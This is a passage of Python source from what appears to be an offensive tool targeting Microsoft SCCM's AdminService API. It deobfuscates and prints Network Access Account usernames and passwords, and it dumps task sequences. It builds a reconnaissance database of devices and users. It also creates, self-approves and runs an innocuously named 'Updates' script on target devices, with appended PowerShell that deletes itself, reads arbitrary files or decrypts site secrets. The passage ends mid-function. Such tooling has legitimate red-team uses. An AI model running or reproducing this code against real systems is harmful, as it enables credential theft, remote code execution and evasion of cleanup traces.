        
    def run(self, path, runas_user, name, collection_type, target_resource, working_dir=""):
        if runas_user == False:
            self.runas_user = "User"
        else:
            self.runas_user = "System"
        
        self.collection_type = collection_type
        self.path = path
        self.working_dir = working_dir
        self.app_name = name
        self.target_resource = target_resource

        if not self.new_collection():
            return
        
        if not self.new_application():
            return
        
        if not self.new_deployment():
            return
        
        if not self.force_policy_update():
            return
    
        self.cleanup()
        return
    
    
class SPEAKTOTHEMANAGER(AdminServiceClient):

    def __init__(self, target, username, password,  kerberos, domain, kdcHost):
        # Note: parameter order is different (target first) but we adapt to base class
        super().__init__(username, password, target,  kerberos, domain, kdcHost, logs_dir=None)
        
    #thx @blurbdust https://github.com/blurbdust/PXEThief/blob/6d21293465959796c629e0a3517f1bb1655289b0/media_variable_file_cryptography.py#L80
    def credential_string_algo(self,credential_string):
        algo_bytes = credential_string[112:116]
        if algo_bytes == "1066":
            hash_type = "aes256"
        elif algo_bytes == "0366":
            hash_type = "3des"
        return hash_type
        
    def aes256_decrypt(self, data,key,iv=b"\x00"*16):

        aes256 = AES.new(key, AES.MODE_CBC, iv)
        decrypted = aes256.decrypt(data)
        return decrypted.decode("utf-16-le")
        
    def _3des_decrypt(self, data,key):

        _3des = DES3.new(key, DES3.MODE_CBC, b"\x00"*8)
        decrypted = _3des.decrypt(data)
        return decrypted.decode("utf-16-le")

    
    def aes_des_key_derivation(self, password):
        key_sha1 = sha1(password).digest()
        
        b0 = b""
        for x in key_sha1:
            b0 += bytes((x ^ 0x36,))
            
        b1 = b""
        for x in key_sha1:
            b1 += bytes((x ^ 0x5c,))

        b0 += b"\x36"*(64 - len(b0))
        b1 += b"\x5c"*(64 - len(b1))
            
        b0_sha1 = sha1(b0).digest()
        b1_sha1 = sha1(b1).digest()
        
        return b0_sha1 + b1_sha1 

    def pretty_print_xml(self, xml_string):
        try:
            root = ET.fromstring(xml_string)
            ET.indent(root, space='  ')
            formatted = (ET.tostring(root, encoding='unicode'))
            return formatted
        except Exception as e:
            logger.info("[-] Could not format XML body. Policy body may be corrupted.")

    def deobfuscate_credential_string(self, credential_string):
        
        algo = self.credential_string_algo(credential_string)
        
        key_data = binascii.unhexlify(credential_string[8:88])
        encrypted_data = binascii.unhexlify(credential_string[128:])

        key = self.aes_des_key_derivation(key_data)
        last_16 = math.floor(len(encrypted_data)/8)*8

        if algo == "3des":
            last_16 = math.floor(len(encrypted_data)/8)*8
            return self._3des_decrypt(encrypted_data[:last_16], key[:24])
        elif algo == "aes256":
            last_16 = math.floor(len(encrypted_data)/16)*16 
            return self.aes256_decrypt(encrypted_data[:last_16], key[:32])

        
    def parse_xml(self, xml):
        #parses NAA and TS policies. NAAs are printed since they're static TS are saved becuase they're thicc
        root = ET.fromstring(xml)
        seen_naas = set()  # Track NAA credentials we've already printed
        seen_ts_hashes = set()  # Track task sequences we've already saved
        
        try:
            for elem in root.iter():
                if elem.get('class') == 'CCM_NetworkAccessAccount':
                    # Collect username and password first
                    username = None
                    password = None

                    for prop in elem.findall(".//*[@name='NetworkAccessUsername']"):
                        value = prop.find("value")
                        if value is not None and value.text:
                            username = self.deobfuscate_credential_string(value.text.strip())
                            username = username[:username.rfind('\x00')]

                    for prop in elem.findall(".//*[@name='NetworkAccessPassword']"):
                        value = prop.find("value")
                        if value is not None and value.text:
                            password = self.deobfuscate_credential_string(value.text.strip())
                            password = password[:password.rfind('\x00')]

                    # Only print if we haven't seen this username before
                    if username and username not in seen_naas:
                        logger.info("[+] Found NAA Policy")
                        logger.info(f"[!] Network Access Account Username: {username}")
                        if password:
                            logger.info(f"[!] Network Access Account Password: {password}")
                        seen_naas.add(username)

                if elem.get('name') == 'TS_Sequence':
                    value_elem = elem.find("value")
                    if value_elem is not None and value_elem.text:
                        ts_data = value_elem.text.strip()
                        ts_sequence = self.deobfuscate_credential_string(ts_data)
                        if ts_sequence:
                            ts_hash = hashlib.md5(ts_sequence.encode()).hexdigest()

                                # Only save if we haven't seen this hash before
                            if ts_hash not in seen_ts_hashes:
                                logger.info("[+] Found Task Sequence policy")
                                # idk what the deal is but there's weird chars at the end so accept the jank
                                try:
                                    if not ts_sequence.endswith('</sequence>'):
                                        stripped_task_sequence = ts_sequence.split('</sequence>')[0] + '</sequence>'
                                    else: stripped_task_sequence = ts_sequence
                                    
                                    if stripped_task_sequence:
                                        pretty_xml = self.pretty_print_xml(stripped_task_sequence)
                                    else:
                                        pretty_xml = ts_sequence
                                        logger.info("[*] Could not pretty print policy, saving unformatted XML")
                                    if pretty_xml:
                                        with open (f"ts_sequence_{ts_hash}.xml", 'w', encoding='utf-8') as f:
                                            f.write(pretty_xml)
                                            logger.info(f"[+] task sequence policy saved to ts_sequence_{ts_hash}.xml")
                                except Exception as e:
                                    raise
                                seen_ts_hashes.add(ts_hash)
                                
        except Exception as e:
            print(e)
            


    def get_naa_policies(self):
        try:
            logger.info("[*] Checking for NAA policies...")
            url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage.GetClientConfigPolicies"
            response = self.http_get(url)
            json_response = response.json()
            xml_bodies = json_response['PolicyXmls']
            for body in xml_bodies:
                self.parse_xml(body)
        except Exception as e:
            print(e)
            pass

                    
    def get_ts_policy(self, ts_package_ids):
        # request the policy and call the parser to save the task sequence 
        url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage.GetTSPolicies"
        for package_id in ts_package_ids:
            try:
                body = {"PackageID" : f"{package_id}",
                        "AdvertisementID": "blah",
                        "AdvertisementName": "blah",
                        "AdvertisementComment": "blah",
                        "SourceSite" : "blah"
                        }
                response = self.http_post(url, json_data=body)
                if response:
                    response_json = response.json()
                    policy_xmls = response_json['PolicyXmls'][0]
                    self.parse_xml(policy_xmls)
                
            except Exception as e:
                    logger.info(e)        
         
    
    def get_ts_packages(self):
        # grab all the TS packages and build a list out of the IDs
        logger.info("[*] Checking for Task Sequence policies...")
        url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage?$select=PackageID"
        response = self.http_request(url)
        if response:
            all_package_ids = []
            json_response = response.json()
            package_ids = json_response['value']
            for package in package_ids:
                package_id = package['PackageID']
                all_package_ids.append(package_id)
            return all_package_ids
        
    def http_request(self, url, body=None):
        try:
            r = self.http_get(url)
            if r.status_code == 401:
                logger.info("Got a 401 access denied. Your user may not have permissions on the AdminService API")
                return None
            elif r.status_code == 404:
                logger.info("Got a 404. Check your target argument.")
                return None
            else:
                return r
        except Exception as e:
            logger.info(e)
        
        

    
    def run(self):
        self.get_naa_policies()
        ts_package_ids = self.get_ts_packages()
        if ts_package_ids:
            self.get_ts_policy(ts_package_ids)
        return



class DATABASE(AdminServiceClient):
    def __init__(self, username=None, password=None, url=None,  kerberos=False, domain=None,  kdcHost=None, logs_dir=None):
        super().__init__(username, password, url,  kerberos, domain, kdcHost, logs_dir)
        self.url = f"https://{url}/AdminService/wmi"
        self._dbname = f"{self.logs_dir}/db/sccmhunter.db"
        self.conn = sqlite3.connect(self._dbname, check_same_thread=False)
        self.run()

    def run(self):
        db_ready = self.validate_tables()
        if db_ready:
            logger.debug("[*] Database built.")
        return True
    
    def validate_tables(self):
        table_names = ["Devices", "Users", "PUsers", "Collections", "lastlogon"]
        try:
            for table_name in table_names:
                validated = self.conn.execute(f'''select name FROM sqlite_master WHERE type=\'table\' and name =\'{table_name}\'
                ''').fetchall()
                if len(validated) == 0:
                    self.build_tables()
            return True
        except Exception as e:
            logger.info("[-] Something went wrong creating tables.")
            logger.debug(f"[-] {e}")
            exit()

    def build_tables(self):
        logger.debug("[*] First time run detected. Building local database.") 
        try:
            self.conn.execute('''CREATE TABLE Devices(Active,Client, DistinguishedName, FullDomainName, 
            IPAddresses,LastLogonUserDomain, LastLogonUserName, Name, OperatingSystemNameandVersion, 
            PrimaryGroupID, ResourceId, ResourceNames, SID, SMSInstalledSites, SMSUniqueIdentifier)''')
            self.conn.execute('''CREATE TABLE Users(DistinguishedName, FullDomainName, FullUserName, Mail, NetworkOperatingSystem, 
            ResourceId, SID, UniqueUserName, UserAccountControl, UserName, UserPrincipalName)''')
            self.conn.execute('''CREATE TABLE PUsers(IsActive,RelationshipResourceID,ResourceID,ResourceName,UniqueUserName)''')
            self.conn.execute('''CREATE TABLE Collections(CollectionID,CollectionType,IsBuiltIn,LimitToCollectionName,MemberClassName,
            MemberCount,Name)''')
            self.conn.execute('''CREATE TABLE lastlogon(Active, Client, DistinguishedName, FullDomainName, IPAddresses,LastLogonUserDomain,
            LastLogonUserName, Name, OperatingSystemNameandVersion,
            PrimaryGroupID, ResourceId, ResourceNames, SID, SMSInstalledSites, SMSUniqueIdentifier)''') 
        except Exception as e:
            logger.info(e)
        finally:
            return True

    def devices(self, devicename):
        try:
            tb = dp.read_sql(f'select * from Devices where Name = \'{devicename}\' COLLATE NOCASE', self.conn)
            if tb.empty:
                logger.debug(f'[-] Device {devicename} not found in local database. Pulling from API.')
                result = self.get_device(devicename=devicename)
                if result:
                    tb = dp.read_sql(f'select * from Devices where Name = \'{devicename}\' COLLATE NOCASE', self.conn)
                else:
                    logger.info(f"[-] Could not find device: {devicename}")
                    return
            logger.info(f'''------------------------------------------
Active: {tb['Active'].to_string(index=False, header=False)}
Client: {tb['Client'].to_string(index=False, header=False)}
DistinguishedName: {tb['DistinguishedName'].to_string(index=False, header=False)}
FullDomainName: {tb['FullDomainName'].to_string(index=False, header=False)}
IPAddresses: {tb['IPAddresses'].to_string(index=False, header=False)}
LastLogonUserDomain: {tb['LastLogonUserDomain'].to_string(index=False, header=False)}
LastLogonUserName: {tb['LastLogonUserName'].to_string(index=False, header=False)}
Name: {tb['Name'].to_string(index=False, header=False)}
OperatingSystemNameandVersion: {tb['OperatingSystemNameandVersion'].to_string(index=False, header=False)}
PrimaryGroupID: {tb['PrimaryGroupID'].to_string(index=False, header=False)}
ResourceId: {tb['ResourceId'].to_string(index=False, header=False)}
ResourceNames: {tb['ResourceNames'].to_string(index=False, header=False)}
SID: {tb['SID'].to_string(index=False, header=False)}
SMSInstalledSites: {tb['SMSInstalledSites'].to_string(index=False, header=False)}
SMSUniqueIdentifier: {tb['SMSUniqueIdentifier'].to_string(index=False, header=False)}
------------------------------------------''')
            return
    
        except Exception as e:
            print(e)

    def get_device(self, devicename):
        logger.info("[*] Collecting device...")
        cursor = self.conn.cursor()
        endpoint = f'''{self.url}/SMS_R_System?$filter=Name eq '{devicename}' '''
        try:
            r = self.http_get(endpoint)
            results = r.json()
            for i in results["value"]:
                if i['Name'].lower() == devicename.lower():
                    logger.info("[+] Device found.")
                    Active = str(i["Active"])
                    Client = str(i["Client"])
                    DistinguishedName = str(i["DistinguishedName"])
                    FullDomainName = str(i["FullDomainName"])
                    IPAddresses = str(i["IPAddresses"]).replace("['", "").replace("']", "").replace("', '", " ")
                    LastLogonUserDomain = str(i["LastLogonUserDomain"])
                    LastLogonUserName = str(i["LastLogonUserName"])
                    Name = str(i["Name"])
                    OperatingSystemNameandVersion = str(i["OperatingSystemNameandVersion"])
                    PrimaryGroupID = str(i["PrimaryGroupID"])
                    ResourceId = str(i["ResourceId"])
                    ResourceNames = str(i["ResourceNames"]).replace("['", "").replace("']", "")
                    Sid = str(i["SID"])
                    SMSInstalledSites = str(i["SMSInstalledSites"]).replace("['", "").replace("']", "")
                    SMSUniqueIdentifier = str(i["SMSUniqueIdentifier"])
                    cursor.execute('''insert into Devices (Active, Client, DistinguishedName, FullDomainName, IPAddresses,  
                    LastLogonUserDomain, LastLogonUserName, Name, OperatingSystemNameandVersion, 
                    PrimaryGroupID, ResourceId, ResourceNames, SID, SMSInstalledSites, SMSUniqueIdentifier) 
                    values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''', (Active,Client,DistinguishedName,FullDomainName,
                                                                IPAddresses,LastLogonUserDomain,LastLogonUserName,
                                                                Name,OperatingSystemNameandVersion,PrimaryGroupID,
                                                                ResourceId,ResourceNames,Sid,SMSInstalledSites,
                                                                SMSUniqueIdentifier))
                    self.conn.commit()
                    return True
                else:
                    return False

        except Exception as e:
            logger.info(e)

    def users(self, username):
        tb = dp.read_sql(f'select * from Users where UserName = \'{username}\' COLLATE NOCASE', self.conn)
        if tb.empty:
            logger.debug(f'[-] User {username} not found in local database. Pulling from API.')
            result = self.get_user(username=username)
            if result:
                tb = dp.read_sql(f'select * from Users where UserName = \'{username}\' COLLATE NOCASE', self.conn)
            else:
                logger.info(f"[-] Could not find user: {username}")
                return
        logger.info(f'''------------------------------------------
DistinguishedName: {tb['DistinguishedName'].to_string(index=False, header=False)}
FullDomainName: {tb['FullDomainName'].to_string(index=False, header=False)}
FullUserName: {tb['FullUserName'].to_string(index=False, header=False)}
Mail: {tb['Mail'].to_string(index=False, header=False)}
NetworkOperatingSystem: {tb['NetworkOperatingSystem'].to_string(index=False, header=False)}
ResourceId: {tb['ResourceId'].to_string(index=False, header=False)}
sid: {tb['SID'].to_string(index=False, header=False)}
UniqueUserName: {tb['UniqueUserName'].to_string(index=False, header=False)}
UserAccountControl: {tb['UserAccountControl'].to_string(index=False, header=False)}
UserName: {tb['UserName'].to_string(index=False, header=False)}
UserPrincipalName: {tb['UserPrincipalName'].to_string(index=False, header=False)}
------------------------------------------''')
        return

    def get_user(self, username):
        logger.info("[*] Collecting users...")
        cursor=self.conn.cursor()
        endpoint = f'''{self.url}/SMS_R_User?$filter=UserName eq '{username}' '''
        try:

            r = self.http_get(endpoint)
            results = r.json()

            for i in results["value"]:
                if i['UserName'].lower() == username.lower():
                    logger.info("[+] User found.")
                    DistinguishedName = str(i["DistinguishedName"])
                    FullDomainName = str(i["FullDomainName"])
                    FullUserName = str(i["FullUserName"])
                    Mail = str(i["Mail"])
                    NetworkOperatingSystem = str(i["NetworkOperatingSystem"])
                    ResourceId = str(i["ResourceId"])
                    sid = str(i["SID"])
                    UniqueUserName = str(i["UniqueUserName"])
                    UserAccountControl = str(i["UserAccountControl"])
                    UserName = str(i["UserName"])
                    UserPrincipalName = str(i["UserPrincipalName"])
                    
                    cursor.execute('''insert into Users (DistinguishedName, FullDomainName, FullUserName, Mail, NetworkOperatingSystem, 
                    ResourceId, SID, UniqueUserName, UserAccountControl, UserName, UserPrincipalName) values (?,?,?,?,?,?,?,?,?,?,?)''',(
                            DistinguishedName,FullDomainName,FullUserName,Mail,NetworkOperatingSystem,ResourceId,
                            sid,UniqueUserName,UserAccountControl,UserName,UserPrincipalName))
                self.conn.commit()
                return True
            else:
                return False
        except Exception as e:
            logger.info(e)

    def get_pusers(self, username):
        logger.info("[*] Collecting primary users...")
        cursor=self.conn.cursor()
        endpoint = f'''{self.url}/SMS_UserMachineRelationship?$filter=endswith(UniqueUsername,'{username}') ''' 

        try:  
            r = self.http_get(endpoint)
            results = r.json()
            for i in results["value"]:
                if len(i['UniqueUserName']) > 1:
                    IsActive = str(i["IsActive"])
                    RelationshipResourceID = str(i["RelationshipResourceID"])
                    ResourceID = str(i["ResourceID"])
                    ResourceName = str(i["ResourceName"])
                    UniqueUserName = str(i["UniqueUserName"]) 
                    cursor.execute('''insert into PUsers (IsActive,RelationshipResourceID,ResourceID,ResourceName,UniqueUserName) values (?,?,?,?,?)''',(
                        IsActive,RelationshipResourceID,ResourceID,ResourceName,UniqueUserName))
                self.conn.commit()

        except Exception as e:
            logger.info(e)

    def pusers(self, username):
        tb = dp.read_sql(f'select * from PUsers where UniqueUserName like \'%{username}\' COLLATE NOCASE', self.conn)
        if tb.empty:
            logger.info(f"[-] Primary user data for {username} not found. Pulling from the API.")
            self.get_pusers(username)
            tb = dp.read_sql(f'select * from PUsers where UniqueUserName like \'%{username}\' COLLATE NOCASE', self.conn)
            if tb.empty:
                logger.info(f'[-] Could not find devices where {username} is the primary user.')
                return
        logger.info((tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')))
        return

    def get_collections(self):
        logger.info("[*] Collecting collections...")
        cursor=self.conn.cursor()
        endpoint = f'''{self.url}/SMS_Collection?$select=CollectionID,CollectionType,IsBuiltIn,LimitToCollectionName,MemberClassName,MemberCount,Name'''   
        r = self.http_get(endpoint)
        results = r.json()
        for i in results["value"]:
            CollectionID = str(i["CollectionID"])
            CollectionType = str(i["CollectionType"])
            IsBuiltIn = str(i["IsBuiltIn"])
            LimitToCollectionName = str(i["LimitToCollectionName"])
            MemberClassName = str(i["MemberClassName"])
            MemberCount = str(i["MemberCount"])
            Name = str(i["Name"])

            cursor.execute('''insert into Collections(CollectionID,CollectionType,IsBuiltIn,LimitToCollectionName,MemberClassName,MemberCount,Name)
            values(?,?,?,?,?,?,?)''', (CollectionID,CollectionType,IsBuiltIn,LimitToCollectionName,MemberClassName,MemberCount,Name))
        self.conn.commit()
        return True


    def collections(self, collection_id):
            if collection_id ==  "*":
                tb = dp.read_sql(f'select CollectionID,MemberCount,Name from Collections', self.conn)
                if tb.empty:
                    logger.info(f'[-] {collection_id} collection(s) not found. Pulling collections from the API')
                    result = self.get_collections()
                    if result:
                        tb = dp.read_sql(f'select CollectionID,MemberCount,Name from Collections', self.conn)
                    else:
                        return
                logger.info((tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')))
                return
            else:
                tb = dp.read_sql(f'select * from Collections where CollectionID = \'{collection_id}\' COLLATE NOCASE', self.conn)
                if tb.empty:
                    logger.info(f'[-] {collection_id} collection(s) not found. Pulling collections from the API')
                    result = self.get_collections()
                    if result:
                        tb = dp.read_sql(f'select * from Collections where CollectionID = \'{collection_id}\' COLLATE NOCASE', self.conn)
                    else:
                        return
                logger.info(f'''--------------------------------------
    CollectionID: {tb['CollectionID'].to_string(index=False, header=False)}
    CollectionType: {tb['CollectionType'].to_string(index=False, header=False)}
    IsBuiltIn: {tb['IsBuiltIn'].to_string(index=False, header=False)}
    LimitToCollectionName: {tb['LimitToCollectionName'].to_string(index=False, header=False)}
    MemberClassName: {tb['MemberClassName'].to_string(index=False, header=False)}
    MemberCount: {tb['MemberCount'].to_string(index=False, header=False)}
    Name: {tb['Name'].to_string(index=False, header=False)}
    ------------------------------------------''')


    def get_lastlogon(self, username):
        logger.info("[*] Collecting devices...")
        cursor = self.conn.cursor()
        endpoint = f'''{self.url}/SMS_R_System?$filter=LastLogonUsername eq '{username}' '''
        self.conn.execute('DROP TABLE IF EXISTS lastlogon;')
        self.conn.execute('''CREATE TABLE lastlogon(Active, Client, DistinguishedName, FullDomainName, IPAddresses,LastLogonUserDomain,
            LastLogonUserName, Name, OperatingSystemNameandVersion,
            PrimaryGroupID, ResourceId, ResourceNames, SID, SMSInstalledSites, SMSUniqueIdentifier)''') 
        try:
            r = self.http_get(endpoint)
            results = r.json()

            for i in results["value"]:
                Active = str(i["Active"])
                Client = str(i["Client"])
                DistinguishedName = str(i["DistinguishedName"])
                FullDomainName = str(i["FullDomainName"])
                IPAddresses = str(i["IPAddresses"]).replace("['", "").replace("']", "").replace("', '", " ")
                LastLogonUserDomain = str(i["LastLogonUserDomain"])
                LastLogonUserName = str(i["LastLogonUserName"])
                Name = str(i["Name"])
                OperatingSystemNameandVersion = str(i["OperatingSystemNameandVersion"])
                PrimaryGroupID = str(i["PrimaryGroupID"])
                ResourceId = str(i["ResourceId"])
                ResourceNames = str(i["ResourceNames"]).replace("['", "").replace("']", "").replace("', '", " ")
                Sid = str(i["SID"])
                SMSInstalledSites = str(i["SMSInstalledSites"]).replace("['", "").replace("']", "")
                SMSUniqueIdentifier = str(i["SMSUniqueIdentifier"])
                
                cursor.execute('''insert into lastlogon (Active, Client, DistinguishedName, FullDomainName, IPAddresses,  
                LastLogonUserDomain, LastLogonUserName, Name, OperatingSystemNameandVersion, 
                PrimaryGroupID, ResourceId, ResourceNames, SID, SMSInstalledSites, SMSUniqueIdentifier) 
                values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''', (Active,Client,DistinguishedName,FullDomainName,
                                                            IPAddresses,LastLogonUserDomain,LastLogonUserName,
                                                            Name,OperatingSystemNameandVersion,PrimaryGroupID,
                                                            ResourceId,ResourceNames,Sid,SMSInstalledSites,
                                                            SMSUniqueIdentifier))
            self.conn.commit()
        except Exception as e:
            logger.info(e)


    def last_logon(self, username):
        self.get_lastlogon(username)
        tb = dp.read_sql(f'select FullDomainName,LastLogonUserDomain,LastLogonUserName,Name,ResourceID,ResourceNames from lastlogon where LastLogonUserName = \'{username}\' COLLATE NOCASE', self.conn)
        if tb.empty:
            logger.info(f"[-] Could not find devices where {username} recently logged in.")
            return
        logger.info((tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')))
        return


    def collection_member(self, collectionid):
        endpoint = f"{self.url}/SMS_CollectionMember_a?$filter=CollectionID eq '{collectionid}'"
        try:
            r = self.http_get(endpoint)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data['value'], list):
                    name_data = [{'Name': item['Name']} for item in data['value']]
                    tb = dp.DataFrame(name_data)
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                else:
                    tb = dp.DataFrame(data['value']['Result'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)  


class SMSSCRIPTS(AdminServiceClient):

    def __init__(self, username, password, target,  kerberos, domain, kdcHost, logs_dir, auser, apassword):
        super().__init__(username, password, target,  kerberos, domain, kdcHost, logs_dir)
        self.approve_user = auser
        self.approve_password = apassword
        self.cwd = os.getcwd()
        self.appended = ""
        self.opid = ""
        self.guid = ""
        self.device = ""

    def run(self, device, optional_target=None):
        if optional_target:
             self.script = optional_target
        self.device = device
        self.add_script()

    def read_script(self):
        #make the script delete itself when done
        cleanup = '''
function Do-Delete {
    Del $MyInvocation.PSCommandPath
}
Do-Delete
'''
        with open(f"{self.script}", "r", encoding='utf-8') as f:
            file_content = f.read()
            file_content += cleanup
            bom = codecs.BOM_UTF16_LE
            byte_array = bom + file_content.encode('utf-16-le')
            script_body = base64.b64encode(byte_array).decode('utf-8')
        return script_body
        
    def get_results(self):
        url = f"https://{self.target}/AdminService/v1.0/Device({self.device})/AdminService.ScriptResult(OperationId={self.opid})"
        while True:
            try:
                r = self.http_get(url)
                if r.status_code == 404:
                    time.sleep(15)
                    continue
                logger.info("[+] Got result:")
                data = r.json()
                output = data['value']['Result'][0]
                result = output['ScriptOutput']
                result = result.replace('["', '')\
                    .replace('"]','')\
                    .replace(r"\u003e", ">")\
                    .replace(r"\r\n", "\n")\
                    .replace('","', "\n")\
                    .replace(',"', "\n")
                formatted_text = "\n".join(line.strip() for line in result.split(r"\n"))
                logger.info(formatted_text)
                self.printlog(formatted_text)
                return True
            except Exception as e:
                logger.info(e)
            return False
    
    def add_script(self, script_body=None):
        try:
            if script_body == None:
                script_body = self.read_script()
            self.guid = str(uuid.uuid4())
            body = {"ApprovalState": 3,
            "ParamsDefinition": "", 
            "ScriptName": "Updates",
            "Author": "",
            "Script": f"{script_body}",
            "ScriptVersion": "1",
            "ScriptType": 0,
            "ParameterlistXML": "",
            "ScriptGuid": f"{self.guid}"
            }
            url = f"https://{self.target}/AdminService/wmi/SMS_Scripts.CreateScripts/"

            try:
                r = self.http_post(url, json_data=body)
                if r.status_code == 201:
                        logger.info(f"[+] Updates script created successfully with GUID {self.guid}.")
                        self.approve_script()
            except KeyboardInterrupt:
                logger.info("Ctrl-C detected. Deleting script ... ")
                self.delete_script()
            except Exception as e:
                logger.info(e)
        except Exception as e:
             logger.info(e)

    def approve_script(self):
        body = {"Approver":"",
                "ApprovalState": "3",
                "Comment": ""
                }
        
        url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/{self.guid}/AdminService.UpdateApprovalState"

        try:
            if self.approve_user:
                 logger.debug("[*] Using alternate credentials to approve script.")
                 username = self.approve_user
                 password = self.approve_password
            else:
                 username= self.username
                 password = self.password
            # Temporarily switch credentials for approval
            original_user = self.username
            original_pass = self.password
            self.username = username
            self.password = password
            r = self.http_post(url, json_data=body)
            # Restore original credentials
            self.username = original_user
            self.password = original_pass
            #print(r.status_code, r.text)
            if r.status_code == 201:
                logger.info(f"[+] Script with guid {self.guid} approved.")
                self.run_script()
            if r.status_code == 500:
                 logger.info(f"[-] Hierarchy settings do not allow author's to approve their own scripts. All custom script execution will fail.")
                 logger.info("[*] Try using alternate approval credentials.")
                 self.delete_script()

            #jlogger.info(results)
        except Exception as e:
                logger.info(e)

    def run_script(self):
        body = {"ScriptGuid": f"{self.guid}"}
        
        url = f"https://{self.target}/AdminService/v1.0/Device({self.device})/AdminService.RunScript"
        
        try:
            r = self.http_post(url, json_data=body)

            logger.info(f"[+] Script with guid {self.guid} executed.")
            json_result = r.json()
            self.opid = (json_result['value'])
            logger.debug(f"[+] Got OperationID: {self.opid}")
            result = self.get_results()
            if result:
                self.delete_script()
        except Exception as e:
                logger.info(e)

    def jprint(self, obj):
        try:
            text = json.dumps(obj, sort_keys=True, indent=4)
            logger.info(text)
        except ValueError:
            return
        
    def delete_script(self, guid=None):
        if guid == None:
            guid = self.guid
        url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/{guid}"

        try:
            r = self.http_delete(url)
            if r.status_code == 204:
                logger.info(f"[+] Script with GUID {guid} deleted.")
        except Exception as e:
                logger.info(e)
               
    # read script contents    
    def get_script(self, guid=None):
        if guid == None:
            guid = self.guid
        url = f"https://{self.target}/AdminService/v1.0/Script/{guid}"

        try:
            r = self.http_get(url)
            if r.status_code == 200:
                logger.info(f"[+] Got script with GUID {guid}.")
                response = r.json()
                
                script_content = response.get("ScriptContent", "")
                script_guid = response.get("ScriptGuid", "") 
                script_name = response.get("ScriptName", "")
                file_name = "%s/loot/%s_%s.ps1" % (self.logs_dir, script_name, script_guid)
                
                script = self.handle_decode(script_content) # CMPivot is utf16-le, who knows if others will get encoded like this too
                
                line_count = len(script.splitlines())# dont blow up the user's terminal
                if line_count >= 500: 
                    user_response = self.get_user_response(line_count)
                    if user_response == "y":
                        pass
                    else:
                        self.save_script(file_name, script)
                        return
                print(script)
                self.save_script(file_name, script)
            if r.status_code == 404:
                logger.info(f"[-] Script with GUID {guid} wasn't found.")
                
        except Exception as e:
                logger.info(e)
                
                
    def get_user_response(self, line_count):
        user_response = input(f"[!] Script body length is {line_count} lines. Do you want to print the script to console? Enter y/n: ").lower()
        if user_response not in ["y", "n"]:
            logger.info("[-] Invalid input. Please enter y or n ")
            self.get_user_response(line_count)
        else:
            return user_response
            
                
    def save_script(self, file_name, script):
        with open(file_name, 'w', encoding='utf-8') as f:
            f.write(script)
            logger.info(f"[*] Script contents saved to {file_name}")
            
                
    def handle_decode(self, script_content):
        bomcheck = script_content.encode('utf-16-le')
        if bomcheck.startswith(b'\xef\xbb\xbf'):
            decoded = bomcheck.decode('utf-8')
            return decoded
        else:
            return script_content
                               
    
    def list_scripts(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_Scripts?$select=ScriptName,ScriptDescription,ScriptGuid,Author,ApprovalState,Approver"

        try:
            r = self.http_get(url)
            if r.status_code == 200:
                logger.info(f"[+] Retrieved existing scripts.")
                data = r.json()
                if isinstance(data['value'], list):
                    tb = dp.DataFrame(data['value'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
        except Exception as e:
                logger.info(e)


    def cat(self, file, device):
        #filecontent cmpivot module doesn't work so here's the bandaid
        script = '''
function do-cat{
    $contents = (Get-Content -Path "%s") -replace 111,222
    return $contents
}
function Do-Delete {
    Del $MyInvocation.PSCommandPath
}
do-cat
Do-Delete
''' %file 
        bom = codecs.BOM_UTF16_LE
        byte_array = bom + script.encode('utf-16-le')
        script_body = base64.b64encode(byte_array).decode('utf-8')
        self.device = device
        self.add_script(script_body)

    def decrypt(self, blob, device):
        script = '''
    Add-Type -Path "C:\\Program Files\\Microsoft Configuration Manager\\bin\\X64\\Microsoft.ConfigurationManager.ManagedBase.dll"

    function Invoke-Decrypt {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory = $true, Position = 0)]
            [string]$Hex,
            
            [Parameter(Mandatory = $false)]
            [switch]$UseSiteSystemKey = $false
        )
        try {
            $encryptedData = $Hex
            $decryptedData = New-Object System.Security.SecureString
            $traceInfo = ""

            $result = [Microsoft.ConfigurationManager.ManagedBase.SiteCrypto]::Decrypt(
                $UseSiteSystemKey,
                $encryptedData,
                [ref]$decryptedData,
                [ref]$traceInfo
            )

            if ($result) {
                # Convert SecureString to plain text
                return [Microsoft.ConfigurationManager.ManagedBase.SiteCrypto]::ToUnsecureString($decryptedData)
            } else {
                throw "Decryption failed. Trace info: $traceInfo"
            }
        } catch {
            Write-Error $_
            $PSCmdlet.ThrowTerminatingError($_)
        }
    }
    function Do-Delete {
        Del $MyInvocation.PSCommandPath
    }

    Invoke-Decrypt -Hex %r
    Do-Delete
    ''' %blob
        bom = codecs.BOM_UTF16_LE
        byte_array = bom + script.encode('utf-16-le')
        script_body = base64.b64encode(byte_array).decode('utf-8')
        self.device = device
        self.add_script(script_body)

    def decryptEx(self, device, session_key, encrypted_blob):
        script = '''
# Load the DLL
Add-Type -Path "C:\\Program Files\\Microsoft Configuration Manager\\bin\\X64\\microsoft.configurationmanager.commonbase.dll"

function Invoke-DecryptEx {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$sessionKey,
        
        [Parameter(Mandatory = $true, Position = 1)]
        [string]$encryptedPwd
    )
    
    try {
        $sessionKeyBytes = [byte[]]::new($sessionKey.Length / 2)    
        $encryptedBytes = [byte[]]::new($encryptedPwd.Length / 2)
        
        for($i = 0; $i -lt $sessionKey.Length; $i += 2) {
